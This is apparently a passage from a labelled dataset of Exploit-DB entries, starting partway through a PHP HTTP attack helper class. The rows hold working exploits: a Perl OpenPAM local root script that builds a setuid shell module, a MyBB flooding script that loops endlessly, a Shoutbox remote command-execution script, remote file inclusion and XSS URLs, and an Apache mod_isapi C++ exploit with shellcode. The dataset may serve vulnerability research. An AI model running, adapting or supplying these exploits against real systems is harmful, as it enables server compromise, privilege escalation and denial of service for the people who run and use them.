	$this->header=$headern."": "".$headervalue; 			} 		} 		// $this->addheader(""name: value""); 		else  		{ 			if(!empty($this->header)) 			{ 				$headarr = explode("": "",$headern); 				$headern = $headarr[0]; 				$headerv = $headarr[1]; 				$this->addheader($headern,$headerv); 			} 			else 			{ 				$this->header=$headern; 			} 		} 	} 	  	/** 	 * This function allows you to use an http proxy server. 	 * Several methods are supported: 	 *  	 * $this->proxy(""proxyip"",""8118""); 	 * or 	 * $this->proxy(""proxyip:8118"") 	 * 	 * @param string $proxyhost 	 * @param integer $proxyport 	 */ 	public function proxy($proxy,$proxyp='') 	{ 		// $this->proxy(""localhost:8118""); 		if(empty($proxyp)) 		{ 			preg_match(""/^(\S*):(\d+)$/"",$proxy,$proxarr); 			$proxh = $proxarr[1]; 			$proxp = $proxarr[2]; 			$this->proxyhost=$proxh; 			$this->proxyport=$proxp; 		} 		// $this->proxy(""localhost"",8118); 		else  		{ 			$this->proxyhost=$proxy; 			$this->proxyport=intval($proxyp); 		} 		if($this->proxyport > 65535) die(""Error: Invalid port number""); 	} 	  	/** 	 * This function allows you to use an http proxy server 	 * which requires a basic authentification. Several 	 * methods are supported: 	 *  	 * $this->proxyauth(""darkfig"",""dapasswd""); 	 * or 	 * $this->proxyauth(""darkfig:dapasswd""); 	 * 	 * @param string $proxyuser 	 * @param string $proxypass 	 */ 	public function proxyauth($proxyauth,$proxypasse='') 	{ 		// $this->proxyauth(""darkfig:password""); 		if(empty($proxypasse)) 		{ 			preg_match(""/^(.*):(.*)$/"",$proxyauth,$proxautharr); 			$proxu = $proxautharr[1]; 			$proxp = $proxautharr[2]; 			$this->proxyuser=$proxu; 			$this->proxypass=$proxp; 		} 		// $this->proxyauth(""darkfig"",""password""); 		else 		{ 			$this->proxyuser=$proxyauth; 			$this->proxypass=$proxypasse; 		} 	}  	 	/** 	 * This function allows you to set the ""User-Agent"" header. 	 * Several methods are possible to do that: 	 *  	 * $this->agent(""Mozilla Firefox""); 	 * or 	 * $this->addheader(""User-Agent: Mozilla Firefox""); 	 * or 	 * $this->addheader(""User-Agent"",""Mozilla Firefox""); 	 *  	 * @param string $useragent 	 */ 	public function agent($useragent) 	{ 		$this->agent=$useragent; 	}  	 	/** 	 * This function returns the header which will be 	 * in the next request. 	 *  	 * $this->showheader(); 	 * 	 * @return $header 	 */ 	public function showheader() 	{ 		return $this->header; 	}  	 	/** 	 * This function returns the cookie which will be 	 * in the next request. 	 *  	 * $this->showcookie(); 	 * 	 * @return $storedcookies 	 */ 	public function showcookie() 	{ 		return $this->cookie; 	}  	 	/** 	 * This function returns the last formed 	 * http request (the http packet). 	 *  	 * $this->showlastrequest(); 	 *  	 * @return $last_http_request 	 */ 	public function showlastrequest() 	{ 		return $this->packet; 	} 	 	 	/** 	 * This function sends the formed http packet with the 	 * GET method. You can precise the port of the host. 	 *  	 * $this->get(""http://localhost""); 	 * $this->get(""http://localhost:888/xd/tst.php""); 	 *  	 * @param string $urlwithpath 	 * @return $server_response 	 */ 	public function get($url) 	{ 		$this->target($url); 		$this->method=""get""; 		return $this->sock(); 	}  	 	/** 	 * This function sends the formed http packet with the 	 * POST method. You can precise the port of the host. 	 *  	 * $this->post(""http://localhost/index.php"",""admin=1&user=dark""); 	 * 	 * @param string $urlwithpath 	 * @param string $postdata 	 * @return $server_response 	 */	 	public function post($url,$data) 	{ 		$this->target($url); 		$this->method=""post""; 		$this->data=$data; 		return $this->sock(); 	} 	  	/** 	 * This function sends the formed http packet with the 	 * POST method using the multipart/form-data enctype.  	 *  	 * $array = array( 	 *          frmdt_url      => ""http://localhost/upload.php"", 	 *          frmdt_boundary => ""123456"",                    # Optional 	 *                 ""email"" => ""me@u.com"", 	 *               ""varname"" => array( 	 *                            frmdt_type => ""image/gif"",   # Optional 	 *                       frmdt_transfert => ""binary"",      # Optional 	 *                        frmdt_filename => ""hello.php"", 	 *                         frmdt_content => ""<?php echo ':)'; ?>"")); 	 * $this->formdata($array); 	 * 	 * @param array $array 	 * @return $server_response 	 */ 	public function formdata($array) 	{ 		$this->target($array[frmdt_url]); 		$this->method=""formdata""; 		$this->data=''; 		if(!isset($array[frmdt_boundary])) $this->boundary=""phpsploit""; 		else $this->boundary=$array[frmdt_boundary]; 		foreach($array as $key => $value) 		{ 			if(!preg_match(""#^frmdt_(boundary|url)#"",$key)) 			{ 				$this->data .= ""-----------------------------"".$this->boundary.""\r\n""; 				$this->data .= ""Content-Disposition: form-data; name=\"""".$key.""\"";""; 				if(!is_array($value)) 				{ 					$this->data .= ""\r\n\r\n"".$value.""\r\n""; 				} 				else 				{ 					$this->data .= "" filename=\"""".$array[$key][frmdt_filename].""\"";\r\n""; 					if(isset($array[$key][frmdt_type])) $this->data .= ""Content-Type: "".$array[$key][frmdt_type].""\r\n""; 					if(isset($array[$key][frmdt_transfert])) $this->data .= ""Content-Transfer-Encoding: "".$array[$key][frmdt_transfert].""\r\n""; 					$this->data .= ""\r\n"".$array[$key][frmdt_content].""\r\n""; 				} 			} 		} 		$this->data .= ""-----------------------------"".$this->boundary.""--\r\n""; 		return $this->sock(); 	}  	 	/** 	 * This function returns the content of the server response 	 * without the headers. 	 *  	 * $this->getcontent($this->get(""http://localhost/"")); 	 * or 	 * $this->getcontent(); 	 * 	 * @param string $server_response 	 * @return $onlythecontent 	 */ 	public function getcontent($code='') 	{ 		if(empty($code)) $code = $this->recv; 		$content = explode(""\n"",$code); 		$onlycode = ''; 		for($i=1;$i<count($content);$i++) 		{ 			if(!preg_match(""/^(\S*):/"",$content[$i])) $ok = 1; 			if($ok) $onlycode .= $content[$i].""\n""; 		} 		return $onlycode; 	}  	 	/** 	 * This function returns the headers of the server response 	 * without the content. 	 *  	 * $this->getheader($this->post(""http://localhost/x.php"",""x=1&z=2"")); 	 * or 	 * $this->getheader(); 	 * 	 * @param string $server_response 	 * @return $onlytheheaders 	 */ 	public function getheader($code='') 	{ 		if(empty($code)) $code = $this->recv; 		$header = explode(""\n"",$code); 		$onlyheader = $header[0].""\n""; 		for($i=1;$i<count($header);$i++) 		{ 			if(!preg_match(""/^(\S*):/"",$header[$i])) break; 			$onlyheader .= $header[$i].""\n""; 		} 		return $onlyheader; 	}  	 	/** 	 * This function is called by the cookiejar() function. 	 * It adds the value of the ""Set-Cookie"" header in the ""Cookie"" 	 * header for the next request. You don't have to call it. 	 *  	 * @param string $server_response 	 */ 	private function getcookie($code) 	{ 		$carr = explode(""\n"",str_replace(""\r\n"",""\n"",$code)); 		for($z=0;$z<count($carr);$z++) 		{ 			if(preg_match(""/set-cookie: (.*)/i"",$carr[$z],$cookarr)) 			{ 				$cookie[] = preg_replace(""/expires=(.*)(GMT||UTC)(\S*)$/i"","""",preg_replace(""/path=(.*)/i"","""",$cookarr[1])); 			} 		}  		for($i=0;$i<count($cookie);$i++) 		{ 			preg_match(""/(\S*)=(\S*)(|;)/"",$cookie[$i],$matches); 	    	        $cookn = $matches[1]; 	    	        $cookv = $matches[2]; 	    	        $this->addcookie($cookn,$cookv); 		}     }  	 	/** 	 * This function is called by the get()/post() functions. 	 * You don't have to call it. 	 * 	 * @param string $urltarg 	 */ 	private function target($urltarg) 	{ 		if(!preg_match(""/^http:\/\/(.*)\//"",$urltarg)) $urltarg .= ""/""; 		$this->url=$urltarg; 		 		$array = explode(""/"",str_replace(""http://"","""",preg_replace(""/:(\d+)/"","""",$urltarg))); 		$this->host=$array[0];  		preg_match(""/:(\d+)\//"",$urltarg,$matches); 		$this->port=empty($matches[1]) ? 80 : $matches[1]; 		 		$temp = str_replace(""http://"","""",preg_replace(""/:(\d+)/"","""",$urltarg)); 		preg_match(""/\/(.*)\//"",$temp,$matches); 		$this->path=str_replace(""//"",""/"",""/"".$matches[1].""/""); 	 		if($this->port > 65535) die(""Error: Invalid port number""); 	} 	 	 	/** 	 * If you call this function, the script will 	 * extract all ""Set-Cookie"" headers values 	 * and it will automatically add them into the ""Cookie"" header 	 * for all next requests. 	 * 	 * $this->cookiejar(1); // enabled 	 * $this->cookiejar(0); // disabled 	 *  	 */ 	public function cookiejar($code) 	{ 		if($code===0) $this->cookiejar=''; 		if($code===1) $this->cookiejar=1; 		else 		{ 			$this->getcookie($code); 		} 	}   	/** 	 * If you call this function, the script will 	 * follow all redirections sent by the server. 	 *  	 * $this->allowredirection(1); // enabled 	 * $this->allowredirection(0); // disabled 	 *  	 * @return $this->get($locationresponse) 	 */ 	public function allowredirection($code) 	{ 		if($code===0) $this->allowredirection=''; 		if($code===1) $this->allowredirection=1; 		else 		{ 			if(preg_match(""/(location|content-location|uri): (.*)/i"",$code,$codearr)) 			{ 				$location = str_replace(chr(13),'',$codearr[2]); 				if(!eregi(""://"",$location)) 				{ 					return $this->get(""http://"".$this->host.$this->path.$location); 				} 				else 				{ 					return $this->get($location); 				} 			} 			else 			{ 				return $code; 			} 		} 	} 	 	 	/** 	 * This function allows you to reset some parameters: 	 *  	 * $this->reset(header); // headers cleaned 	 * $this->reset(cookie); // cookies cleaned 	 * $this->reset();       // clean all parameters 	 * 	 * @param string $func 	 */ 	public function reset($func='') 	{ 		switch($func) 		{ 			case ""header"": 			$this->header=''; 			break; 			 			case ""cookie"": 			$this->cookie=''; 			break; 			 			default: 		        $this->cookiejar=''; 		        $this->header=''; 		        $this->cookie=''; 		        $this->allowredirection='';  		        $this->agent=''; 		        break; 		} 	} } ?>  # milw0rm.com [2007-03-18]",Code Execution,1
28612,RedBLoG 0.5 - '/admin/config.php?root_path' Remote File Inclusion source: https://www.securityfocus.com/bid/20115/info   The redblog application is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.   Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  http://www.example.com/Path/admin/config.php?root_path=http://www.example.com,fails to sufficiently sanitize user-supplied data,1
36296,"OpenPAM - 'pam_start()' Local Privilege Escalation source: https://www.securityfocus.com/bid/50607/info  OpenPAM is prone to a local privilege-escalation vulnerability.  Local attackers may exploit this issue to execute arbitrary code with superuser privileges. Successfully exploiting this issue will result in the complete compromise of affected computers.   #!/usr/bin/perl  # kcheckpass invoking pam_start() with user provided # service argument, what a bad idea. OpenPAM accepts that. # Maybe this pam_start() vulnerability is exploitable via # other vectors as well. # Vuln tested on a FreeBSD 8.1. It does not affect # Linux PAM, as it is checking for / character  # (C) 2011 by some dude, meant as a PoC! Only use on your own # machine and on your own risk!!! # # This commit is likely to fix the bug: # http://trac.des.no/openpam/changeset/478/trunk/lib/openpam_configure.c #  my $kcheckpass = ""/usr/local/kde4/lib/kde4/libexec/kcheckpass"";  # build suid shell open(O,"">/tmp/slam.c"") or die $!; print O<<EOC;  #include <stdio.h> #include <unistd.h>  void __attribute__((constructor)) init() { 	char *a[] = {""/bin/sh"", NULL}; 	setuid(0); 	execve(*a, a, NULL); } EOC close(O);  # build fake pam module system(""gcc -fPIC -Wall -c /tmp/slam.c -o /tmp/slam.o;gcc -shared -o /tmp/slam.so /tmp/slam.o"");  # build fake PAM service file open(O,"">/tmp/pamslam"") or die $!; print O<<EOP; auth	sufficient	/tmp/slam.so EOP close(O);  print ""We need more Elchsalami! Happy birthday dude!\n""; exec(""$kcheckpass -c ../../../tmp/pamslam -m classic"");",privilege-escalation,1
39095,"MyBB 1.6.12 - 'misc.php' Remote Denial of Service source: https://www.securityfocus.com/bid/65545/info  MyBB is prone to a remote denial-of-service vulnerability.  An attacker can exploit this issue to crash the affected application, denying service to legitimate users.  MyBB 1.6.12 is vulnerable; other versions may be also be affected.     # Mybb All Version Denial of Service Vulnerability  #!/usr/bin/perl  # Iranian Exploit DataBase # Mybb All Version Denial of Service Vulnerability # Test on Mybb 1.6.12 # Vendor site : www.mybb.com # Code Written By Amir - iedb.team () gmail com - o0_shabgard_0o ()  yahoo com # Site : Www.IeDb.Ir/acc   -   Www.IrIsT.Ir # Fb Page : https://www.facebook.com/iedb.ir # Greats : Medrik - Bl4ck M4n - ErfanMs - TaK.FaNaR  - F () riD - N20 -  Bl4ck N3T - 0x0ptim0us - 0Day # E2MA3N - l4tr0d3ctism - H-SK33PY - sole sad - r3d_s0urc3 - Dr_Evil -  z3r0 - Mr.Zer0 - one alone hacker # DICTATOR - dr.koderz - E1.Coders - Security - ARTA - ARYABOD - Behnam  Vanda - C0dex - Dj.TiniVini # Det3cT0r - yashar shahinzadeh And All Members In IeDb.Ir/acc ##################################### use Socket; if (@ARGV < 2) { &usage } $rand=rand(10); $host = $ARGV[0]; $dir = $ARGV[1]; $host =~ s/(http:\/\/)//eg; for ($i=0; $i<10; $i--) { $data =  ""forums%5B%5D=all&version=rss2.0&limit=1500000&make=%D8%AF%D8%B1%DB%8C%D8%A7%D9%81%D8%AA+%D9%84%DB%8C%D9%86%DA%A9+%D9%BE%DB%8C%D9%88%D9%86%D8%AF+%D8%B3%D8%A7%DB%8C%D8%AA%DB%8C""; $len = length $data; $foo = ""POST "".$dir.""misc.php?action=syndication HTTP/1.1\r\n"". ""Accept: * /*\r\n"". ""Accept-Language: en-gb\r\n"". ""Content-Type: application/x-www-form-urlencoded\r\n"". ""Accept-Encoding: gzip, deflate\r\n"". ""User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n"". ""Host: $host\r\n"". ""Content-Length: $len\r\n"". ""Connection: Keep-Alive\r\n"". ""Cache-Control: no-cache\r\n\r\n"". ""$data""; my $port = ""80""; my $proto = getprotobyname('tcp'); socket(SOCKET, PF_INET, SOCK_STREAM, $proto); connect(SOCKET, sockaddr_in($port, inet_aton($host))) || redo; send(SOCKET,""$foo"", 0); syswrite STDOUT, ""+"" ; } print ""\n\n""; system('ping $host'); sub usage { print ""################################################# \n""; print ""##       Mybb All Version Denial of Service Vulnerability\n""; print ""## Discoverd By Amir - iedb.team () gmail com - Id :  o0_shabgard_0o \n""; print ""##      Www.IeDb.Ir/acc   -   Www.IrIsT.Ir \n""; print ""################################################# \n""; print ""## [host] [path] \n""; print ""## http://host.com /mybb/\n""; print ""################################################# \n""; exit(); }; ##################################### #  Archive Exploit = http://www.iedb.ir/exploits-1332.html #####################################  ###########################  # Iranian Exploit DataBase = http://IeDb.Ir [2014-02-12]  ###########################",denial-of-service,1
22702,"Webfroot Shoutbox 2.32 - 'Expanded.php' Remote Command Execution source: https://www.securityfocus.com/bid/7772/info  Shoutbox is prone to an issue that may result in the execution of attacker-supplied code. The vulnerability exists due to insufficient sanitization of input into the expanded.php script.   #------------------------------------------------------------------------- # # expanded.php remote command execution Xploit # # Coded By _6mO_HaCk # # The Hackology Team # # Usage = perl expanded.pl <target> <port> <command> # # exp   = perl expanded.pl 127.0.0.1 80 ls #       = perl expanded.pl localhost 80 touch+/tmp/owned  use IO::Socket; use strict;  system(clear); print ""------------------------------------------\n""; print ""--- expanded.php remote cmd execution  ---\n""; print ""---              Xploit                ---\n""; print ""---                                    ---\n""; print ""---         Coded By _6mO_HaCk         ---\n""; print ""---                                    ---\n""; print ""--- Greetz to : effbeeye, D|NOOO       ---\n""; print ""---             Thom4sss, DeV|L0Ty     ---\n""; print ""---             MajNouN, |BiG-LuV|     ---\n""; print ""---                                    ---\n""; print ""---         The Hackology Team         ---\n""; print ""------------------------------------------\n"";  if(!defined($ARGV[0] && $ARGV[1] && $ARGV[2])) {    &usage; } my $host     = $ARGV[0]; my $port     = $ARGV[1]; my $cmd      = $ARGV[2];  my $conf     =""/tmp/.xploit""; my $sbdir    =""/shoutbox""; # define this to ur shoutbox dir if different my $target   =""expanded.php?conf=""; my $Xploit   = ""GET ${sbdir}/${target}${conf}&cmd=$cmd HTTP/1.1\nHost:  $host\nConnection: Close\n\n"";  my $tcpval   = getprotobyname('tcp'); my $serverIP = inet_aton($host); my $serverAddr = sockaddr_in($ARGV[1], $serverIP); my $protocol_name = ""tcp"";  my $ia       = inet_aton($host) 	   || die (""[-] Unable to resolve  $host""); my $pa       = sockaddr_in($port, $ia)     || die (""[-] Unkown error""); my $proto    = getprotobyname('tcp')       || die (""[-] Unable to get  protocol""); socket(SOCK, PF_INET, SOCK_STREAM, $proto) || die (""[-] Unable to open  socket""); connect(SOCK, $pa) 			   || die (""[-] Unable to connect  to $host:$port"");  print ""[*] Executing $cmd on $host:$port ...\n""; sleep(2);  my $submit   = ""$Xploit"";    send(SOCK,$submit,0); close(SOCK);  sub usage {die(""\n\n[*] Usage : perl $0 <TargetIP> <TargetPort>  <CmdToRun>\n\n"");} print ""\n""; print ""\n[+] Command should be successfully executed\n"";  #-------------------------------------------------------------------------",the execution of attacker-supplied code,1
29367,"PHP iCalendar 1.1/2.x - 'search.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/21792/info      PHP icalendar is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.       An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user. This may help the attacker steal cookie-based authentication credentials and launch other attacks.      http://www.example.com/phpicalendar/search.php?cpath=&cal=Home%2CUS%2BHolidays%2CWork &getdate=19700102&query=ss""><script>alert()</script>&submit.x=11&submit.y=15   http://www.example.com/phpicalendar/search.php?cpath=""><script>alert()</script>&cal=Home %2CUS%2BHolidays%2CWork&getdate=19700102&query=ss&submit.x=11&submit.y=12   http://www.example.com/phpicalendar/search.php?cpath=&cal=Home%2CUS%2BHolidays%2CWork &getdate=19700102""><script>alert()</script>&query=ss&submit.x=11&submit.y=12",have arbitrary script code execute in the browser of an unsuspecting user,1
11650,"Apache 2.2.14 mod_isapi - Dangling Pointer Remote SYSTEM /*  * Apache 2.2.14 mod_isapi Dangling Pointer Remote SYSTEM Exploit (CVE-2010-0425)  * ------------------------------------------------------------------------------  *  * Advisory: http://www.senseofsecurity.com.au/advisories/SOS-10-002  *   * Description:  * pwn-isapi.cpp exploits a dangling pointer vulnerabilty in Apache 2.2.14 mod_isapi.  * Due to the nature of the vulnerability, and exploitation method, DEP should be limited to essential   * Windows programs and services. At worst, if DEP is enabled for the Apache process, you could cause   * a constant DoS by looping this (since apache will automatically restart) :)  *  * Note that the exploit code may need to be run multiple times before a shell is spawned (70%  * success rate - tested on three different systems). Furthermore, the exploit code may require   * modification to exploit this vulnerability on different platforms. This is due to loaded memory   * references to the unloaded DLL (they will be different for each ISAPI module). Do not test  * this code in a VM otherwise the code may fail to send the RESET packet (something to do with  * VMware gracefully closing the connection, instead of sending a RESET packet) - I didnt want  * to have to use raw packets on Windows.   *  * Shellcode Note:   * The shellcode writes ""pwn-isapi"" to ""sos.txt"" which is created in the current working directory.   * Most operating systems should be supported by this shellcode. I've used Skylined's method of finding  * the base address of kernel32.dll for Windows 7 and modified it so that it will find the base   * address of msvcrt.dll instead. I've also added another check so that it will be able to detect  * ""msvcrt.dll"" on Windows Server 2003 (this OS loads msvcrt.dll in 5th position, and before this  * DLL string is read, another DLL (RPCRT4.dll) length is verifiied which matches the length of   * msvcrt.dll. So the added check will verify the presents of ""m"" before proceeding.   *  * Author:   * Brett Gervasoni (brettg [at] senseofsecurity.com.au)  *  * Copyright Sense of Security Pty Ltd 2010.   * http://www.senseofsecurity.com.au  */  #include <iostream> #include <windows.h> #include <winsock.h> #include <string> #include <direct.h>  #pragma comment(lib, ""wsock32.lib"")  using namespace std;  #define SERVER_PORT 80  void header(); int createConnection(string targetAddr, int targetPort); int sendTransmission(string message); string recvTransmission(); void cleanUp();  WORD sockVersion; WSADATA wsaData;  int sock; struct sockaddr_in rserver;  int main(int argc, char *argv[]) { 	string serverIP, isapiDLL; 	string triggerVuln, payload; 	char accept[171], referer[733], cookie[5376], random[7604], postData[23379], footer[299];  	//custom shellcode that writes ""pwn-isapi"" to ""sos.txt"" in the current working directory 	//Note: There are four NOPs at the end for padding. Not really needed.  	char shellcode[] = ""\x31\xc0\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x56\x08\x8b"" 					   ""\x7e\x20\x8b\x36\x66\x39\x4f\x14\x75\xf2\x66\xb9\x01\x6d\x66\x81\xe9\x94"" 					   ""\x6c\x66\x39\x0f\x66\x89\xc1\x75\xe1\x89\xe5\xeb\x71\x60\x8b\x6c\x24\x24"" 					   ""\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3"" 					   ""\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1"" 					   ""\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66"" 					   ""\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61"" 					   ""\xc3\xad\x50\x52\xe8\xaa\xff\xff\xff\x89\x07\x66\x81\xc4\x0c\x01\x66\x81"" 					   ""\xec\x04\x01\x66\x81\xc7\x08\x01\x66\x81\xef\x04\x01\x39\xce\x75\xde\xc3"" 					   ""\xeb\x10\x5e\x8d\x7d\x04\x89\xf1\x80\xc1\x0c\xe8\xcd\xff\xff\xff\xeb\x3b"" 					   ""\xe8\xeb\xff\xff\xff\x6e\x7c\x2e\xe1\x1e\x3c\x3f\xd7\x74\x1e\x48\xcd\x31"" 					   ""\xd2\x58\x88\x50\x07\xeb\x2f\x31\xd2\x59\x88\x51\x01\xeb\x2e\x51\x50\xff"" 					   ""\x55\x04\xeb\x2c\x31\xd2\x59\x88\x51\x09\xeb\x33\x51\x50\x89\xc6\xff\x55"" 					   ""\x08\x53\xff\x55\x0c\xe8\xd1\xff\xff\xff\x73\x6f\x73\x2e\x74\x78\x74\x4e"" 					   ""\xe8\xcc\xff\xff\xff\x77\x4e\xe8\xcd\xff\xff\xff\xe8\xcf\xff\xff\xff\x70"" 					   ""\x77\x6e\x2d\x69\x73\x61\x70\x69\x4e\xe8\xc8\xff\xff\xff\x90\x90\x90\x90"";  	header();  	if (argc < 3) 	{ 		printf(""usage: %s <ip> <DLL>\n"", argv[0]); 		return 1; 	}  	serverIP = string(argv[1]); 	isapiDLL = string(argv[2]);  	//all these values could be set to 7601 + sizeof(shellcode) 	//but mixing it up is good.  	memset(accept, 'A', 170); 	memset(referer, 'A', 732); 	memset(cookie, 'A', 5375); 	memset(random, 'A', 7603); 	memset(postData, 'A', 23378); 	memset(footer, 'A', 298);  	triggerVuln = ""POST /cgi-bin/"" + isapiDLL + "" HTTP/1.0\r\n"" 		""User-Agent: AAAAAAAA\r\n"" 		""Pragma: no-cache\r\n"" 		""Proxy-Connection: Keep-Alive\r\n"" 		""Host: "" + serverIP + ""\r\n"" 		""Content-Length: 40334\r\n\r\n"" + 		string(footer);  	//Modify the below request if needed (depending on where your function pointer is pointing) 	//Do so by adding or removing headers. So if you want to hit a higher function pointer,  	//keep adding headers :)  	//Note: If performing this blindly, try it a few times, change a bit, try again.  	//During testing i found that using a chunk of data the same size with the same header name 	//was more unreliable. In memory, large amounts of nulls are being placed either side of the  	//payload. Since the function pointer address was random, by slightly mixing up the size of  	//each header i would get better results. 	payload = ""POST /cgi-bin/"" + isapiDLL + "" HTTP/1.0\r\n"" 		""Accept: "" + string(accept) + ""\r\n"" 		""Referer: "" + string(referer) + string(shellcode) + ""\r\n"" 		""From: "" + string(cookie) + string(shellcode) + ""\r\n"" 		""Utruvh-guiergher: "" + string(cookie) + string(shellcode) + ""\r\n"" 		""Accept-Language: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"" 		""Content-Type: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"" 		""UA-CPU: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"" 		""Pragma: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"" 		""User-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"" 		""Cookie: "" + string(cookie) + string(shellcode) + ""\r\n"" 		""Host: "" + serverIP + ""\r\n"" 		""Proxy-Connection: Keep-Alive\r\n"" 		""Okytuasd: "" + string(cookie) + string(shellcode) + ""\r\n"" 		""Asdasdasdasdasd: "" + string(random) + string(shellcode) + ""\r\n"" 		""Asdasda: "" + string(random) + string(shellcode) + ""\r\n"" 		""Sewrwefbui: "" + string(random) + string(shellcode) + ""\r\n"" 		""Qdfasdernu: "" + string(random) + string(shellcode) + ""\r\n"" 		""Cdffew-asdf: "" + string(random) + string(shellcode) + ""\r\n"" 		""Kuiytnb-Ehrf: "" + string(cookie) + string(shellcode) + ""BBBB"" + ""\r\n"" 		""Lsfergjnuibubiu: "" + string(cookie) + string(shellcode) + ""BBBB"" + ""\r\n"" 		""Baefrwerifnhu: "" + string(cookie) + string(shellcode) + ""BBBB"" + ""\r\n"" 		""Zdsfno: "" + string(cookie) + string(shellcode) + ""BBBB"" + ""\r\n"" 		""Psdfsafn: "" + string(cookie) + string(shellcode) + ""BBBB"" + ""\r\n"" 		""Zefwefnuivre-sdf: "" + string(cookie) + string(shellcode) + ""BBBB"" + ""\r\n"" 		""Ivre-sdf: "" + string(cookie) + string(shellcode) + ""BBBB"" + ""\r\n"" 		""Yvasde-sdf: "" + string(cookie) + string(shellcode) + ""BBBB"" + ""\r\n"" 		""Yuionbsdf: "" + string(cookie) + string(shellcode) + ""BBBB"" + ""\r\n"" 		""Yasdasdasdf: "" + string(cookie) + string(shellcode) + ""BBBB"" + ""\r\n"" 		""asdasdde-sdf: "" + string(cookie) + string(shellcode) + ""BBBB"" + ""\r\n"" 		""Ertuioert-erf: "" + string(cookie) + string(shellcode) + ""BBBB"" + ""\r\n"" 		""Content-Length: 25054\r\n\r\n"" +  		string(postData) + ""CCCC"" + string(shellcode) + ""BBBB"" + string(footer);  	//Setup connection 	if (createConnection(serverIP, SERVER_PORT) == 1) 	{ 		printf(""- an error occurred connecting to the server\n""); 		return 1; 	}  	printf(""[+] Connected to %s.\n"", serverIP.c_str());  	printf(""[+] Setting socket data structure values\n""); 	int iOptVal; 	int aiOptVal; 	 	struct linger linger_data; 	 	//This is meant to set closesocket to do a ""graceful close"", 	//however this is not the case when WSACancelBlockingCall() is called. A RESET packet is  	//sent as a result - Note that if in a vm, for some reason a RESET packet does not get sent.  	linger_data.l_onoff = 0; 	linger_data.l_linger = 0;  	setsockopt(sock, SOL_SOCKET, SO_LINGER, (char*)&linger_data, sizeof(linger_data)); 	setsockopt(sock, SOL_SOCKET, SO_DONTLINGER, (char*)&linger_data, sizeof(linger_data));  	//Set SO_LINGER to 0 so WSACancelBlockingCall() will cause a RESET packet to be sent 	getsockopt(sock, SOL_SOCKET, SO_LINGER, (char*)&linger_data, &iOptVal); 	getsockopt(sock, SOL_SOCKET, SO_DONTLINGER, (char*)&linger_data, &aiOptVal); 	printf(""    - SO_LINGER value is set to %ld\n"", linger_data.l_onoff); 	printf(""    - SO_DONTLINGER value is set to %ld\n"", linger_data.l_linger); 	 	printf(""[*] Triggering DLL unload\n""); 	sendTransmission(triggerVuln);  	Sleep(2000); //Sleep for a bit, otherwise on first run a RESET packet doesn't get sent.  	WSACancelBlockingCall(); //Cause reset packet response  	Sleep(2000); //The multiple Sleeps seem to break up stuff a bit, making it more reliable... 	closesocket(sock);  	Sleep(2000); 	WSACleanup(); 	 	Sleep(2000); 	printf(""[+] The DLL should be unloaded by now\n""); 	 	//Reconnect to deliver payload 	if (createConnection(serverIP, SERVER_PORT) == 1) 	{ 		printf(""- an error occurred connecting to the server\n""); 		return 1; 	} 	 	printf(""[*] Sending payload\n""); 	sendTransmission(payload);  	cleanUp();  	printf(""[+] Check to see if sos.txt was created...\n"");  	return 0; }  void header() { 	printf(""Apache 2.2.14 mod_isapi Remote SYSTEM Exploit (CVE-2010-0425)\n""); 	printf(""-------------------------------------------------------------\n""); 	printf(""         Brett Gervasoni (brettg [at] senseofsecurity.com.au)\n""); 	printf(""                    Copyright Sense of Security Pty Ltd 2010.\n""); }  //Setup the server int createConnection(string serverIP, int port) { 	int result = 0, len = 0;  	sockVersion = MAKEWORD(1,1); 	WSAStartup(sockVersion, &wsaData); 	 	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) 	{ 		perror(""error: socket()\n""); 		result = 1; 	}  	rserver.sin_family = AF_INET; 	rserver.sin_port = htons(port); 	rserver.sin_addr.s_addr = inet_addr(serverIP.c_str()); 	memset(&rserver.sin_zero, 0, 8);  	len = sizeof(struct sockaddr_in); 	 	if ((connect(sock, (struct sockaddr *)&rserver, sizeof(struct sockaddr_in))) == -1) 	{ 		perror(""error: connect()\n""); 		result = 1; 	}  	return result; }  //Send a message int sendTransmission(string message) { 	int bytes_sent = 0;  	bytes_sent = send(sock, message.c_str(), message.length(), 0); 	if (bytes_sent < 0) 	{ 		perror(""error: send()\n""); 		exit(1); 	} 	 	return bytes_sent; }  //Receive a message string recvTransmission() { 	string result; 	char *c = new char[1]; 	int bytes_recv = 0;  	while (c[0] != NULL) 	{ 		bytes_recv = recv(sock, c, 1, 0);  		if (bytes_recv < 0) 		{ 			perror(""error: recv()\n""); 			//exit(1); 		}  		result += c[0]; 	}  	return result; }  //Clean up the connection void cleanUp() { 	closesocket(sock); 	WSACleanup(); }",cause a constant DoS,1
